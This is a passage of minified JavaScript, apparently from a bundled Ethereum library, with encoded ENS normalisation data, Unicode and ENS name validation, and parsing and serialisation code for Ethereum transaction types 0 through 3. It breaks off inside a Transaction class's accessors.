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";const vf=44032,Eg=4352,Cg=4449,Ag=4519,Gx=19,Kx=21,ih=28,xg=Kx*ih,jee=Gx*xg,Hee=vf+jee,qee=Eg+Gx,Vee=Cg+Kx,Wee=Ag+ih;function gd(t){return t>>24&255}function Zx(t){return t&16777215}let lb,p6,ub,M0;function Gee(){let t=jx(zee);lb=new Map(Hx(t).flatMap((e,r)=>e.map(n=>[n,r+1<<24]))),p6=new Set(yf(t)),ub=new Map,M0=new Map;for(let[e,r]of qx(t)){if(!p6.has(e)&&r.length==2){let[n,i]=r,s=M0.get(n);s||(s=new Map,M0.set(n,s)),s.set(i,e)}ub.set(e,r.reverse())}}function Jx(t){return t>=vf&&t<Hee}function Kee(t,e){if(t>=Eg&&t<qee&&e>=Cg&&e<Vee)return vf+(t-Eg)*xg+(e-Cg)*ih;if(Jx(t)&&e>Ag&&e<Wee&&(t-vf)%ih==0)return t+(e-Ag);{let r=M0.get(t);return r&&(r=r.get(e),r)?r:-1}}function Qx(t){lb||Gee();let e=[],r=[],n=!1;function i(s){let o=lb.get(s);o&&(n=!0,s|=o),e.push(s)}for(let s of t)for(;;){if(s<128)e.push(s);else if(Jx(s)){let o=s-vf,a=o/xg|0,c=o%xg/ih|0,l=o%ih;i(Eg+a),i(Cg+c),l>0&&i(Ag+l)}else{let o=ub.get(s);o?r.push(...o):i(s)}if(!r.length)break;s=r.pop()}if(n&&e.length>1){let s=gd(e[0]);for(let o=1;o<e.length;o++){let a=gd(e[o]);if(a==0||s<=a){s=a;continue}let c=o-1;for(;;){let l=e[c+1];if(e[c+1]=e[c],e[c]=l,!c||(s=gd(e[--c]),s<=a))break}s=gd(e[o])}}return e}function Zee(t){let e=[],r=[],n=-1,i=0;for(let s of t){let o=gd(s),a=Zx(s);if(n==-1)o==0?n=a:e.push(a);else if(i>0&&i>=o)o==0?(e.push(n,...r),r.length=0,n=a):r.push(a),i=o;else{let c=Kee(n,a);c>=0?n=c:i==0&&o==0?(e.push(n),n=a):(r.push(a),i=o)}}return n>=0&&e.push(n,...r),e}function Yx(t){return Qx(t).map(Zx)}function Jee(t){return Zee(Qx(t))}const g6=45,Xx=".",e7=65039,t7=1,Ig=t=>Array.from(t);function Ef(t,e){return t.P.has(e)||t.Q.has(e)}class Qee extends Array{get is_emoji(){return!0}}let hb,r7,Ua,db,n7,Kl,Nm,Ol,Ea,w6,fb;function B2(){if(hb)return;let t=jx(kee);const e=()=>yf(t),r=()=>new Set(e()),n=(u,h)=>h.forEach(d=>u.add(d));hb=new Map(qx(t)),r7=r(),Ua=e(),db=new Set(e().map(u=>Ua[u])),Ua=new Set(Ua),n7=r(),r();let i=Hx(t),s=t();const o=()=>{let u=new Set;return e().forEach(h=>n(u,i[h])),n(u,e()),u};Kl=bf(u=>{let h=bf(t).map(d=>d+96);if(h.length){let d=u>=s;h[0]-=32,h=nh(h),d&&(h=`Restricted[${h}]`);let f=o(),g=o(),p=!t();return{N:h,P:f,Q:g,M:p,R:d}}}),Nm=r(),Ol=new Map;let a=e().concat(Ig(Nm)).sort((u,h)=>u-h);a.forEach((u,h)=>{let d=t(),f=a[h]=d?a[h-d]:{V:[],M:new Map};f.V.push(u),Nm.has(u)||Ol.set(u,f)});for(let{V:u,M:h}of new Set(Ol.values())){let d=[];for(let g of u){let p=Kl.filter(m=>Ef(m,g)),w=d.find(({G:m})=>p.some(b=>m.has(b)));w||(w={G:new Set,V:[]},d.push(w)),w.V.push(g),n(w.G,p)}let f=d.flatMap(g=>Ig(g.G));for(let{G:g,V:p}of d){let w=new Set(f.filter(m=>!g.has(m)));for(let m of p)h.set(m,w)}}Ea=new Set;let c=new Set;const l=u=>Ea.has(u)?c.add(u):Ea.add(u);for(let u of Kl){for(let h of u.P)l(h);for(let h of u.Q)l(h)}for(let u of Ea)!Ol.has(u)&&!c.has(u)&&Ol.set(u,t7);n(Ea,Yx(Ea)),w6=Lee(t).map(u=>Qee.from(u)).sort(Fee),fb=new Map;for(let u of w6){let h=[fb];for(let d of u){let f=h.map(g=>{let p=g.get(d);return p||(p=new Map,g.set(d,p)),p});d===e7?h.push(...f):h=f}for(let d of h)d.V=u}}function L2(t){return(i7(t)?"":`${U2(A1([t]))} `)+Wx(t)}function U2(t){return`"${t}"`}function Yee(t){if(t.length>=4&&t[2]==g6&&t[3]==g6)throw new Error(`invalid label extension: "${nh(t.slice(0,4))}"`)}function Xee(t){for(let r=t.lastIndexOf(95);r>0;)if(t[--r]!==95)throw new Error("underscore allowed only at start")}function ete(t){let e=t[0],r=d6.get(e);if(r)throw Od(`leading ${r}`);let n=t.length,i=-1;for(let s=1;s<n;s++){e=t[s];let o=d6.get(e);if(o){if(i==s)throw Od(`${r} + ${o}`);i=s+1,r=o}}if(i==n)throw Od(`trailing ${r}`)}function A1(t,e=1/0,r=Wx){let n=[];tte(t[0])&&n.push(""),t.length>e&&(e>>=1,t=[...t.slice(0,e),8230,...t.slice(-e)]);let i=0,s=t.length;for(let o=0;o<s;o++){let a=t[o];i7(a)&&(n.push(nh(t.slice(i,o))),n.push(r(a)),i=o+1)}return n.push(nh(t.slice(i,s))),n.join("")}function tte(t){return B2(),Ua.has(t)}function i7(t){return B2(),n7.has(t)}function rte(t){return ote(nte(t,Jee,lte))}function nte(t,e,r){if(!t)return[];B2();let n=0;return t.split(Xx).map(i=>{let s=Mee(i),o={input:s,offset:n};n+=s.length+1;try{let a=o.tokens=cte(s,e,r),c=a.length,l;if(!c)throw new Error("empty label");let u=o.output=a.flat();if(Xee(u),!(o.emoji=c>1||a[0].is_emoji)&&u.every(d=>d<128))Yee(u),l="ASCII";else{let d=a.flatMap(f=>f.is_emoji?[]:f);if(!d.length)l="Emoji";else{if(Ua.has(u[0]))throw Od("leading combining mark");for(let p=1;p<c;p++){let w=a[p];if(!w.is_emoji&&Ua.has(w[0]))throw Od(`emoji + combining mark: "${nh(a[p-1])} + ${A1([w[0]])}"`)}ete(u);let f=Ig(new Set(d)),[g]=ste(f);ate(g,d),ite(g,f),l=g.N}}o.type=l}catch(a){o.error=a}return o})}function ite(t,e){let r,n=[];for(let i of e){let s=Ol.get(i);if(s===t7)return;if(s){let o=s.M.get(i);if(r=r?r.filter(a=>o.has(a)):Ig(o),!r.length)return}else n.push(i)}if(r){for(let i of r)if(n.every(s=>Ef(i,s)))throw new Error(`whole-script confusable: ${t.N}/${i.N}`)}}function ste(t){let e=Kl;for(let r of t){let n=e.filter(i=>Ef(i,r));if(!n.length)throw Kl.some(i=>Ef(i,r))?o7(e[0],r):s7(r);if(e=n,n.length==1)break}return e}function ote(t){return t.map(({input:e,error:r,output:n})=>{if(r){let i=r.message;throw new Error(t.length==1?i:`Invalid label ${U2(A1(e,63))}: ${i}`)}return nh(n)}).join(Xx)}function s7(t){return new Error(`disallowed character: ${L2(t)}`)}function o7(t,e){let r=L2(e),n=Kl.find(i=>i.P.has(e));return n&&(r=`${n.N} ${r}`),new Error(`illegal mixture: ${t.N} + ${r}`)}function Od(t){return new Error(`illegal placement: ${t}`)}function ate(t,e){for(let r of e)if(!Ef(t,r))throw o7(t,r);if(t.M){let r=Yx(e);for(let n=1,i=r.length;n<i;n++)if(db.has(r[n])){let s=n+1;for(let o;s<i&&db.has(o=r[s]);s++)for(let a=n;a<s;a++)if(r[a]==o)throw new Error(`duplicate non-spacing marks: ${L2(o)}`);if(s-n>f6)throw new Error(`excessive non-spacing marks: ${U2(A1(r.slice(n-1,s)))} (${s-n}/${f6})`);n=s}}}function cte(t,e,r){let n=[],i=[];for(t=t.slice().reverse();t.length;){let s=ute(t);if(s)i.length&&(n.push(e(i)),i=[]),n.push(r(s));else{let o=t.pop();if(Ea.has(o))i.push(o);else{let a=hb.get(o);if(a)i.push(...a);else if(!r7.has(o))throw s7(o)}}}return i.length&&n.push(e(i)),n}function lte(t){return t.filter(e=>e!=e7)}function ute(t,e){let r=fb,n,i=t.length;for(;i&&(r=r.get(t[--i]),!!r);){let{V:s}=r;s&&(n=s,t.length=i)}return n}const a7=new Uint8Array(32);a7.fill(0);function m6(t){return M(t.length!==0,"invalid ENS name; empty component","comp",t),t}function c7(t){const e=Fs(hte(t)),r=[];if(t.length===0)return r;let n=0;for(let i=0;i<e.length;i++)e[i]===46&&(r.push(m6(e.slice(n,i))),n=i+1);return M(n<e.length,"invalid ENS name; empty component","name",t),r.push(m6(e.slice(n))),r}function hte(t){try{if(t.length===0)throw new Error("empty label");return rte(t)}catch(e){M(!1,`invalid ENS name (${e.message})`,"name",t)}}function pb(t){M(typeof t=="string","invalid ENS name; not a string","name",t),M(t.length,"invalid ENS name (empty label)","name",t);let e=a7;const r=c7(t);for(;r.length;)e=$t(Ot([e,$t(r.pop())]));return ue(e)}function dte(t,e){const r=e;return M(r<=255,"DNS encoded label cannot exceed 255","length",r),ue(Ot(c7(t).map(n=>{M(n.length<=r,`label ${JSON.stringify(t)} exceeds ${r} bytes`,"name",t);const i=new Uint8Array(n.length+1);return i.set(n,1),i[0]=i.length-1,i})))+"00"}function Pm(t,e){return{address:ot(t),storageKeys:e.map((r,n)=>(M(gt(r,32),"invalid slot",`storageKeys[${n}]`,r),r.toLowerCase()))}}function Fc(t){if(Array.isArray(t))return t.map((r,n)=>Array.isArray(r)?(M(r.length===2,"invalid slot set",`value[${n}]`,r),Pm(r[0],r[1])):(M(r!=null&&typeof r=="object","invalid address-slot set","value",t),Pm(r.address,r.storageKeys)));M(t!=null&&typeof t=="object","invalid access list","value",t);const e=Object.keys(t).map(r=>{const n=t[r].reduce((i,s)=>(i[s]=!0,i),{});return Pm(r,Object.keys(n).sort())});return e.sort((r,n)=>r.address.localeCompare(n.address)),e}function fte(t){let e;return typeof t=="string"?e=mf.computePublicKey(t,!1):e=t.publicKey,ot($t("0x"+e.substring(4)).substring(26))}function pte(t,e){return fte(mf.recoverPublicKey(t,e))}const Gt=BigInt(0),gte=BigInt(2),wte=BigInt(27),mte=BigInt(28),yte=BigInt(35),bte=BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),km=4096*32;function y6(t,e){let r=t.toString(16);for(;r.length<2;)r="0"+r;return r+=wh(e).substring(4),"0x"+r}function x1(t){return t==="0x"?null:ot(t)}function M2(t,e){try{return Fc(t)}catch(r){M(!1,r.message,e,t)}}function ap(t,e){return t==="0x"?0:Re(t,e)}function kt(t,e){if(t==="0x")return Gt;const r=ge(t,e);return M(r<=bte,"value exceeds uint size",e,r),r}function yt(t,e){const r=ge(t,"value"),n=Ir(r);return M(n.length<=32,"value too large",`tx.${e}`,r),n}function F2(t){return Fc(t).map(e=>[e.address,e.storageKeys])}function vte(t,e){M(Array.isArray(t),`invalid ${e}`,"value",t);for(let r=0;r<t.length;r++)M(gt(t[r],32),"invalid ${ param } hash",`value[${r}]`,t[r]);return t}function Ete(t){const e=b1(t);M(Array.isArray(e)&&(e.length===9||e.length===6),"invalid field count for legacy transaction","data",t);const r={type:0,nonce:ap(e[0],"nonce"),gasPrice:kt(e[1],"gasPrice"),gasLimit:kt(e[2],"gasLimit"),to:x1(e[3]),value:kt(e[4],"value"),data:ue(e[5]),chainId:Gt};if(e.length===6)return r;const n=kt(e[6],"v"),i=kt(e[7],"r"),s=kt(e[8],"s");if(i===Gt&&s===Gt)r.chainId=n;else{let o=(n-yte)/gte;o<Gt&&(o=Gt),r.chainId=o,M(o!==Gt||n===wte||n===mte,"non-canonical legacy v","v",e[6]),r.signature=fi.from({r:kc(e[7],32),s:kc(e[8],32),v:n})}return r}function Cte(t,e){const r=[yt(t.nonce,"nonce"),yt(t.gasPrice||0,"gasPrice"),yt(t.gasLimit,"gasLimit"),t.to||"0x",yt(t.value,"value"),t.data];let n=Gt;if(t.chainId!=Gt)n=ge(t.chainId,"tx.chainId"),M(!e||e.networkV==null||e.legacyChainId===n,"tx.chainId/sig.v mismatch","sig",e);else if(t.signature){const s=t.signature.legacyChainId;s!=null&&(n=s)}if(!e)return n!==Gt&&(r.push(Ir(n)),r.push("0x"),r.push("0x")),Oc(r);let i=BigInt(27+e.yParity);return n!==Gt?i=fi.getChainIdV(n,e.v):BigInt(e.v)!==i&&M(!1,"tx.chainId/sig.v mismatch","sig",e),r.push(Ir(i)),r.push(Ir(e.r)),r.push(Ir(e.s)),Oc(r)}function z2(t,e){let r;try{if(r=ap(e[0],"yParity"),r!==0&&r!==1)throw new Error("bad yParity")}catch{M(!1,"invalid yParity","yParity",e[0])}const n=kc(e[1],32),i=kc(e[2],32),s=fi.from({r:n,s:i,yParity:r});t.signature=s}function Ate(t){const e=b1(Ve(t).slice(1));M(Array.isArray(e)&&(e.length===9||e.length===12),"invalid field count for transaction type: 2","data",ue(t));const r={type:2,chainId:kt(e[0],"chainId"),nonce:ap(e[1],"nonce"),maxPriorityFeePerGas:kt(e[2],"maxPriorityFeePerGas"),maxFeePerGas:kt(e[3],"maxFeePerGas"),gasPrice:null,gasLimit:kt(e[4],"gasLimit"),to:x1(e[5]),value:kt(e[6],"value"),data:ue(e[7]),accessList:M2(e[8],"accessList")};return e.length===9||z2(r,e.slice(9)),r}function xte(t,e){const r=[yt(t.chainId,"chainId"),yt(t.nonce,"nonce"),yt(t.maxPriorityFeePerGas||0,"maxPriorityFeePerGas"),yt(t.maxFeePerGas||0,"maxFeePerGas"),yt(t.gasLimit,"gasLimit"),t.to||"0x",yt(t.value,"value"),t.data,F2(t.accessList||[])];return e&&(r.push(yt(e.yParity,"yParity")),r.push(Ir(e.r)),r.push(Ir(e.s))),Ot(["0x02",Oc(r)])}function Ite(t){const e=b1(Ve(t).slice(1));M(Array.isArray(e)&&(e.length===8||e.length===11),"invalid field count for transaction type: 1","data",ue(t));const r={type:1,chainId:kt(e[0],"chainId"),nonce:ap(e[1],"nonce"),gasPrice:kt(e[2],"gasPrice"),gasLimit:kt(e[3],"gasLimit"),to:x1(e[4]),value:kt(e[5],"value"),data:ue(e[6]),accessList:M2(e[7],"accessList")};return e.length===8||z2(r,e.slice(8)),r}function Ste(t,e){const r=[yt(t.chainId,"chainId"),yt(t.nonce,"nonce"),yt(t.gasPrice||0,"gasPrice"),yt(t.gasLimit,"gasLimit"),t.to||"0x",yt(t.value,"value"),t.data,F2(t.accessList||[])];return e&&(r.push(yt(e.yParity,"recoveryParam")),r.push(Ir(e.r)),r.push(Ir(e.s))),Ot(["0x01",Oc(r)])}function Nte(t){let e=b1(Ve(t).slice(1)),r="3",n=null;if(e.length===4&&Array.isArray(e[0])){r="3 (network format)";const s=e[1],o=e[2],a=e[3];M(Array.isArray(s),"invalid network format: blobs not an array","fields[1]",s),M(Array.isArray(o),"invalid network format: commitments not an array","fields[2]",o),M(Array.isArray(a),"invalid network format: proofs not an array","fields[3]",a),M(s.length===o.length,"invalid network format: blobs/commitments length mismatch","fields",e),M(s.length===a.length,"invalid network format: blobs/proofs length mismatch","fields",e),n=[];for(let c=0;c<e[1].length;c++)n.push({data:s[c],commitment:o[c],proof:a[c]});e=e[0]}M(Array.isArray(e)&&(e.length===11||e.length===14),`invalid field count for transaction type: ${r}`,"data",ue(t));const i={type:3,chainId:kt(e[0],"chainId"),nonce:ap(e[1],"nonce"),maxPriorityFeePerGas:kt(e[2],"maxPriorityFeePerGas"),maxFeePerGas:kt(e[3],"maxFeePerGas"),gasPrice:null,gasLimit:kt(e[4],"gasLimit"),to:x1(e[5]),value:kt(e[6],"value"),data:ue(e[7]),accessList:M2(e[8],"accessList"),maxFeePerBlobGas:kt(e[9],"maxFeePerBlobGas"),blobVersionedHashes:e[10]};n&&(i.blobs=n),M(i.to!=null,`invalid address for transaction type: ${r}`,"data",t),M(Array.isArray(i.blobVersionedHashes),"invalid blobVersionedHashes: must be an array","data",t);for(let s=0;s<i.blobVersionedHashes.length;s++)M(gt(i.blobVersionedHashes[s],32),`invalid blobVersionedHash at index ${s}: must be length 32`,"data",t);return e.length===11||z2(i,e.slice(11)),i}function Pte(t,e,r){const n=[yt(t.chainId,"chainId"),yt(t.nonce,"nonce"),yt(t.maxPriorityFeePerGas||0,"maxPriorityFeePerGas"),yt(t.maxFeePerGas||0,"maxFeePerGas"),yt(t.gasLimit,"gasLimit"),t.to||wf,yt(t.value,"value"),t.data,F2(t.accessList||[]),yt(t.maxFeePerBlobGas||0,"maxFeePerBlobGas"),vte(t.blobVersionedHashes||[],"blobVersionedHashes")];return e&&(n.push(yt(e.yParity,"yParity")),n.push(Ir(e.r)),n.push(Ir(e.s)),r)?Ot(["0x03",Oc([n,r.map(i=>i.data),r.map(i=>i.commitment),r.map(i=>i.proof)])]):Ot(["0x03",Oc(n)])}var Ti,au,cu,lu,uu,hu,du,fu,pu,gu,wu,mu,Qa,yo,xs,bo,yu,F0;const ws=class ws{constructor(){H(this,yu);H(this,Ti);H(this,au);H(this,cu);H(this,lu);H(this,uu);H(this,hu);H(this,du);H(this,fu);H(this,pu);H(this,gu);H(this,wu);H(this,mu);H(this,Qa);H(this,yo);H(this,xs);H(this,bo);$(this,Ti,null),$(this,au,null),$(this,lu,0),$(this,uu,Gt),$(this,hu,null),$(this,du,null),$(this,fu,null),$(this,cu,"0x"),$(this,pu,Gt),$(this,gu,Gt),$(this,wu,null),$(this,mu,null),$(this,Qa,null),$(this,yo,null),$(this,bo,null),$(this,xs,null)}get type(){return A(this,Ti)}set type(e){switch(e){case null:$(this,Ti,null);break;case 0:case"legacy":$(this,Ti,0);break;case 1:case"berlin":case"eip-2930":$(this,Ti,1);break;case 2:case"london":case"eip-1559":$(this,Ti,2);break;case 3:case"cancun":case"eip-4844":$(this,Ti,3);break;default:M(!1,"unsupported transaction type","type",e)}}get typeName(){switch(this.type){case 0:return"legacy";case 1:return"eip-2930";case 2:return"eip-1559";case 3:return"eip-4844"}return null}get to(){const e=A(this,au);return e==null&&this.type===3?wf:e}set to(e){$(this,au,e==null?null:ot(e))}get nonce(){return A(this,lu)}set nonce(e){$(this,lu,Re(e,"value"))}get gasLimit(){return A(this,uu)}set gasLimit(e){$(this,uu,ge(e))}get gasPrice(){const e=A(this,hu);return e==null&&(this.type===0||this.type===1)?Gt:e}set gasPrice(e){$(this,hu,e==null?null:ge(e,"gasPrice"))}get maxPriorityFeePerGas(){const e=A(this,du);return e??(this.type===2||this.type===3?Gt:null)}set maxPriorityFeePerGas(e){$(this,du,e==null?null:ge(e,"maxPriorityFeePerGas"))}get maxFeePerGas(){const e=A(this,fu);return e??(this.type===2||this.type===3?Gt:null)}set maxFeePerGas(e){$(this,fu,e==null?null:ge(e,"maxFeePerGas"))}get data(){return A(this,cu)}set data(e){$(this,cu,ue(e))}get value(){return A(this,pu)}set value(e){$(this,pu,ge(e,"value"))}get chainId(){return A(this,gu)}set chainId(e){$(this,gu,ge(e))}get signature(){return A(this,wu)||null}set signature(e){$(this,wu,e==null?null:fi.from(e))}get accessList(){const e=A(this,mu)||null;return e??(this.type===1||this.type===2||this.type===3?[]:null)}set accessList(e){$(this,mu,e==null?null:Fc(e))}get 